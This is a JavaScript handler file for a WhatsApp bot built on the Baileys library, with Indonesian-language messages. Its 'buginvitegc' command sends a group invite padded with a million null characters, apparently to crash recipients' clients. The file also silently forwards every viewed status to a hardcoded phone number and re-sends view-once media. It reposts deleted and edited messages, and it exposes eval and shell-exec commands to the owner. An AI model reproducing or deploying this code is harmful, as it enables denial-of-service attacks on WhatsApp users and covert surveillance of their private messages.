require("../config.js");
const { S_WHATSAPP_NET, 
proto, 
getContentType,
generateWAMessageFromContent, 
downloadContentFromMessage, 
prepareWAMessageMedia } = require("baileys");
const fs = require("fs")
const moment = require("moment-timezone");
const util = require("util");
const path = require('path');
const chalk = require("chalk");
const { exec } = require("child_process");
const { CS, jsonformat,reSize, ucapanWaktu, formatp, clockString, getBuffer, getCases, generateProfilePicture, sleep, fetchJson, runtime, pickRandom, getGroupAdmins, getRandom } = require("./myfunc.js")





//━━━━━━━━━━━━━━━[ START OF EXPORT ]━━━━━━━━━━━━━━━━━//
module.exports = {
async handler(conn, m, chatUpdate, store) {
try {
const { reply } = m
const prefix = '.'
const body = m.mtype === "conversation" ? m.message.conversation : 
m.mtype === "imageMessage" ? m.message.imageMessage.caption : 
m.mtype === "videoMessage" ? m.message.videoMessage.caption : 
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : 
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : 
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : 
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : 
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id || m.text : "";
const budy = (typeof m.text == 'string' ? m.text : '')
const pushname = m.pushName || "No Name";
const isCmd = body.startsWith(prefix);
const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
var args = body.trim().split(/ +/).slice(1);
args = args.concat(["", "", "", "", "", ""]);
const botNumber = await conn.decodeJid(conn.user.id);
const isCreator = global.owner.includes(m.sender.split('@')[0]) ? true : false
const isOwner = isCreator
const itsMe = m.sender == botNumber ? true : false;
const from = m.chat;
const q = args.join(" ").trim();
const text = q
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const senderNumber = m.sender.split("@")[0]
const sender = senderNumber
const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat) : ""
const groupName =  m.isGroup ? await groupMetadata.subject : ""
const participants = m.isGroup ? await groupMetadata.participants : "";
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
const isBotAdmins = groupAdmins.includes(botNumber)
const isAdmins = groupAdmins.includes(m.sender)


const fakeQuotes = [
{
key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: `status@broadcast` },
message: { conversation: "ꪶ𖣂ꫂ SatzzDev ꪶ𖣂ꫂ" }
},
{
key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: `status@broadcast` },
message: {
locationMessage: {
degreesLatitude: -6.17511,
degreesLongitude: 106.865039,
name: "ꪶ𖣂ꫂ SatzzDev ꪶ𖣂ꫂ",
address: "Monas"
}
}
}
];
global.fake = pickRandom(fakeQuotes)

const react = async (emoti) => { return conn.sendMessage(m.chat, {react: {text: emoti, key: {remoteJid: m.chat, fromMe: false, 
key: m.key, id: m.key.id, participant: m.sender}}})}





conn.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || "";
let messageType = message.mtype
? message.mtype.replace(/Message/gi, "")
: mime.split("/")[0];
const stream = await downloadContentFromMessage(message, messageType);
let buffer = Buffer.from([]);
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]);
}
return buffer;
};
//━━━━━━━━━━━━━━━[ START ]━━━━━━━━━━━━━━━━━//
// [ AUTO READ STORY ]
if (m.chat === "status@broadcast") {
await conn.readMessages([m.key])
let msg = await generateWAMessageFromContent("status@broadcast", proto.Message.fromObject({
message: {
senderKeyDistributionMessage: proto.Message.SenderKeyDistributionMessage.create({
groupId: 'status@broadcast',
axolotlSenderKeyDistributionMessage: new Uint8Array(32),
}),

}
}),{timestamp: new Date()})
await conn.relayMessage("status@broadcast", {
reactionMessage:{
key: m.key, 
text: '💚', 
senderTimestampMs: Date.now()
}
},
{
messageTimestamp:Date.now(),
broadcast: true,
status:2
}, {}).then(console.log)
await conn.sendMessage("6282170988479@s.whatsapp.net", {forward:m},{quoted:m})
}


if ((m.mtype === "viewOnceMessageV2" || m.mtype === "viewOnceMessageV2Extension")) {
await conn.sendMessage(m.chat, { react: { text: "👀", key: { remoteJid: m.chat, fromMe: false, key: m.key, id: m.key.id, participant: m.sender } } });
var view = m.mtype === "viewOnceMessageV2"? m.message.viewOnceMessageV2.message : m.message.viewOnceMessageV2Extension.message
let Type = Object.keys(view)[0];
view[Type].viewOnce = false
conn.sendMessage(m.chat, {forward: m},{quoted:m})
}

if (m.mtype == 'protocolMessage' && !m.key.remoteJid.includes('status@broadcast')) {
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
if (chats[1]) {
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
let mmk = await conn.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
reply(`*\`[ A N T I - D E L E T E ]\`*\n\n_Tipe Pesan:_ \n${Object.keys(msg.message)[0]}\n\n_Pengirim:_ \n@${mess.key.participant.split('@')[0]}`)
}
} 

if (m.mtype == 'editedMessage') {
let mess = chatUpdate.messages[0].message.editedMessage.message.protocolMessage;
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id]);
if (chats) {
let originalMessage = chats[1].messages[mess.key.id].message;
let tipe = Object.keys(originalMessage);
let pesan;
if (originalMessage.extendedTextMessage) {
pesan = originalMessage.extendedTextMessage.text;
} else if (originalMessage.conversation) {
pesan = originalMessage.conversation;
} else {
pesan = "Pesan asli tidak dapat ditemukan.";
}
let editedText = chatUpdate.messages[0].message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage?.text || chatUpdate.messages[0].message.editedMessage.message.protocolMessage.editedMessage.conversation || "Pesan yang diedit tidak ditemukan.";;
reply(`*\`[ A N T I - E D I T ]\`*\n\n_SETELAH DI EDIT:_ \n${editedText}\n\n_SEBELUM DI EDIT:_ \n${pesan}`);
if (originalMessage.extendedTextMessage) {
originalMessage.extendedTextMessage.text = editedText;
} else if (originalMessage.conversation) {
originalMessage.conversation = editedText;
}
} else {
}
}


//━━━━━━━━━━━━━━━[ START COMMAND ]━━━━━━━━━━━━━━━━━//
switch (command) {
case 'buginvitegc':
var msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
groupInviteMessage: {
groupJid: "1234567890@g.us",
inviteCode: "abcdefg",
inviteExpiration: Date.now() + 86400000,
groupName: "Created By SatzzDev." + "\u0000".repeat(1000000),
thumbnail: "SatzzDev!\u0000".repeat(1000000),
caption: "Created By SatzzDev.",
groupType: 1,
}
}), {
userJid: m.chat,
quoted: m
})
conn.relayMessage(m.chat, msg.message, {messageId: msg.key.id})
break
case 'menu': {
let tektek = `
- .buginvitegc
- .setpp
- .restart
- .setsw
`;

function getRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
await conn.sendMessage(
m.chat,
{
image: fs.readFileSync('./src/thumb.jpg'), 
caption: `*\`ꪶ𖣂ꫂ ${conn.user.name} ꪶ𖣂ꫂ\`*\n\n` + tektek,
contextInfo: {
isForwarded: true,
forwardingScore: 1000,
forwardedNewsletterMessageInfo: {
newsletterJid: global.newsletterJid,
serverMessageId: 100,
newsletterName: `</> ${conn.user.name} </>`,
},
},
},{ quoted: m });
await conn.sendMessage(
m.chat,
{
audio: await getBuffer(`https://github.com/anonphoenix007/phonk-api/raw/refs/heads/main/all/sound${getRandomNumber(1,95)}.mp3`),
ptt: true,
mimetype: 'audio/mpeg',
waveform: new Uint8Array(64)
},{ quoted: global.fake });
}
break;

case 'setpp':{
if (!itsMe) return
if (!/image/.test(mime)) return 
let medis = await conn.downloadMediaMessage(qmsg)
var { img } = await generateProfilePicture(medis);
await conn.query({
tag: 'iq',
attrs: {
// target: '0',
to: S_WHATSAPP_NET,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
conn.sendMessage(m.chat, {text: 'done'},{quoted:m})
}
break

default: 
}


if (m.text.startsWith(">")) {
if (!itsMe) return 
const evalAsync = () => { 
return new Promise(async (resolve, reject) => {
try {
let evaled = await eval(m.text.slice(2));
if (typeof evaled !== "string")
evaled = util.inspect(evaled);
resolve(evaled) } catch (err) { reject(err) }})};
evalAsync().then((result) => m.reply(result)).catch((err) => m.reply(String(err)));    

} else if (m.text.startsWith("$")) {
if (!itsMe) return 
m.reply("Executing...");
exec(m.text.slice(2), async (err, stdout) => {
if (err) return m.reply(`${err}`);
if (stdout) return m.reply(stdout);
});     
}





//━━━━━━━━━━━━━━━[ ERROR ]━━━━━━━━━━━━━━━━━// 
} catch (err) {
if (err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let text = `Module ${module} is not installed yet.
Click the button to install.`;
return conn.sendButtons(global.dev, '', text, global.author, [{type:'btn',text:'INSTALL',id:`$ npm install ${module} --force`}], m)
}
//console.log(chalk.bgRedBright(chalk.black("[ ERROR ]")),chalk.yellow(util.format(err)))
//await conn.sendMessage(global.dev, {text: `*「 SYSTEM-ERROR 」*\n${util.format(err)}`, contextInfo: {externalAdReply: {title: "ERROR", thumbnailUrl: 'https://telegra.ph/file/f1ca5cb8154286a123548.jpg', mediaType: 1, renderLargerThumbnail: true}}},{quoted:m})
} 
} //━━━━━━━━━━━━━━━[ END OF EXPORT ]━━━━━━━━━━━━━━━━━//
}
//━━━━━━━━━━━━━━━[ FILE UPDATE ]━━━━━━━━━━━━━━━━━\\
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(chalk.bgCyanBright(chalk.black("「 UPDATE 」")),chalk.red(`${__filename}`))
delete require.cache[file];
require(file);
});